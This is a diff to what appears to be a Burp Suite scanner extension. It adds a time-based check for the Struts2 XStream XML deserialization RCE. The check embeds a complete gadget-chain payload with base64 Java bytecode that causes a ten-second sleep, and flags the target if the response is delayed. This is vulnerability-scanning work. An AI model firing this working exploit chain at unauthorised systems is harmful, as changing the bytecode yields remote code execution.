@@ -121,12 +121,151 @@ class PerRequestScans(IScannerCheck):
 
     def doStrutsXMLScan(self, basePair):
 
-        attack = callbacks.makeHttpRequest(basePair.getHttpService(), basePair.getRequest())
-        return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
-            [attack],
-            'Struts2 XML deserialization RCE',
-            "The application appears blah",
-            'Firm', 'High')]
+        (ignore, req) = setHeader(basePair.getRequest(), 'Content-Type', 'application/xml', True) # set to XML header 
+
+
+        #(ignore, req) = setHeader(req, 'Referer', basePair.getUrl(), True) # set referer
+        #(ignore, req) = setHeader(req, 'Accept', '*/*', True) # set referer, dun think it matters
+        # put payload in the request 
+
+        # timeout = 3 # cant set time out for each request in burp .... 
+
+        #req = helpers.addParameter(req, helpers.buildParameter('test', null, IParameter.PARAM_BODY))
+        # make a get request first, then convert to POST  
+        payload_sleep_based_10seconds = """
+<map>
+  <entry>
+    <jdk.nashorn.internal.objects.NativeString>
+      <flags>0</flags>
+      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
+        <dataHandler>
+          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
+            <is class="javax.crypto.CipherInputStream">
+              <cipher class="javax.crypto.NullCipher">
+                <initialized>false</initialized>
+                <opmode>0</opmode>
+                <serviceIterator class="javax.imageio.spi.FilterIterator">
+                  <iter class="javax.imageio.spi.FilterIterator">
+                    <iter class="java.util.Collections$EmptyIterator"/>
+                    <next class="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl" serialization="custom">
+                      <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
+                        <default>
+                          <__name>Pwnr</__name>
+                          <__bytecodes>
+                            <byte-array>yv66vgAAADIAMwoAAwAiBwAxBwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFu
+dFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEA
+EkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJD
+bGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5
+bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94
+c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2Vy
+aWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFs
+YW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUv
+eG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9u
+cwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29t
+L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3Vu
+L29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7
+KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1B
+eGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFs
+L3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMu
+amF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNs
+ZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRp
+bWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcv
+YXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFs
+L3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQAQamF2YS9sYW5nL1RocmVhZAcAKgEA
+BXNsZWVwAQAEKEopVgwALAAtCgArAC4BAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVy
+MTY3MTMxNTc4NjQ1ODk0AQAgTHlzb3NlcmlhbC9Qd25lcjE2NzEzMTU3ODY0NTg5NDsAIQACAAMA
+AQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0A
+AAAGAAEAAAAuAA4AAAAMAAEAAAAFAA8AMgAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0A
+AAAGAAEAAAAzAA4AAAAgAAMAAAABAA8AMgAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAa
+AAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA3AA4AAAAqAAQAAAABAA8AMgAA
+AAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAiAAMA
+AgAAAA2nAAMBTBEnEIW4AC+xAAAAAQAwAAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJ
+</byte-array>
+                            <byte-array>yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFu
+dFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEA
+EkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2Vy
+aWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2
+YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xh
+bmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRp
+bC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQAB
+AAAABSq3AAGxAAAAAgANAAAABgABAAAAOwAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAA
+AAoAAQACABYAEAAJ</byte-array>
+                          </__bytecodes>
+                          <__transletIndex>-1</__transletIndex>
+                          <__indentNumber>0</__indentNumber>
+                        </default>
+                        <boolean>false</boolean>
+                      </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
+                    </next>
+                  </iter>
+                  <filter class="javax.imageio.ImageIO$ContainsFilter">
+                    <method>
+                      <class>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</class>
+                      <name>newTransformer</name>
+                      <parameter-types/>
+                    </method>
+                    <name>foo</name>
+                  </filter>
+                  <next class="string">foo</next>
+                </serviceIterator>
+                <lock/>
+              </cipher>
+              <input class="java.lang.ProcessBuilder$NullInputStream"/>
+              <ibuffer/>
+              <done>false</done>
+              <ostart>0</ostart>
+              <ofinish>0</ofinish>
+              <closed>false</closed>
+            </is>
+            <consumed>false</consumed>
+          </dataSource>
+          <transferFlavors/>
+        </dataHandler>
+        <dataLen>0</dataLen>
+      </value>
+    </jdk.nashorn.internal.objects.NativeString>
+    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
+  </entry>
+  <entry>
+    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
+    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
+  </entry>
+</map>
+"""
+        #payload = "test"
+        req = helpers.toggleRequestMethod(req) # Correct
+        req = helpers.buildHttpMessage( helpers.analyzeRequest(req).getHeaders(), helpers.stringToBytes(payload_sleep_based_10seconds)) # easy way to add xml to body 
+#        req = helpers.buildHttpMessage( helpers.analyzeRequest(req).getHeaders(), helpers.stringToBytes(payload)) # easy way to add xml to body 
+
+        (ignore, req) = setHeader(req, 'Content-Type', 'application/xml', True) # set to XML header 
+        #print(safe_bytes_to_string(req))
+
+        import time 
+        request_time = time.time()
+        # add payload to req 
+
+        attack = callbacks.makeHttpRequest(basePair.getHttpService(), req) # send out the request 
+        response_time = time.time()
+        time_diff = int(response_time - request_time)
+        #print("TIME DIFF")
+        #print(str(time_diff))
+
+        # The above will block until getting 500 back, this is annoying
+        # we need to get the time diff for request and response, 
+        # if the time diff is > 10, then it is vuln.... 
+
+        #print(request)
+        status_code = helpers.analyzeResponse(attack.getResponse()).getStatusCode()
+
+        if time_diff >= 10:
+            # print("VULN")
+            return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
+                [attack],
+                'Struts2 XML deserialization RCE',
+                "The application appears to be timeout (10 secs)",
+                'Firm', 'High')]
+        # print ("NOT VULN")
+        return [] # not vuln, no timeout
 
     def doCodePathScan(self, basePair, base_resp_print):
         xml_resp, xml_req = self._codepath_attack(basePair, 'application/xml')
